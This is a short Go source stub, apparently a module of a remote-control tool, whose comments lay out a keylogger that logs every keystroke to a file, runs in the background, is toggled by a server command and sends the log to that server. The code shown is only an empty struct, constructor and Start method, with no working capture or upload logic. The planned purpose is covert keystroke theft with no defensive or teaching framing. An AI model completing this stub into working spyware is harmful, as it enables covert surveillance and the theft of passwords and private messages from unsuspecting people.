package modules

// write a simple keylogger that will log all keystrokes to a file
// the keylogger will run in the background and will be triggered by a command from the server
// the keylogger will be able to be turned on and off by the server
// the keylogger will be able to be configured to send the log file to the server

type klogger struct {
}

func Keylogger() *klogger {

	keylogger := &klogger{}

	return keylogger
}

// start the keylogger
func (k *klogger) Start() {
}

// logic for the keylogger
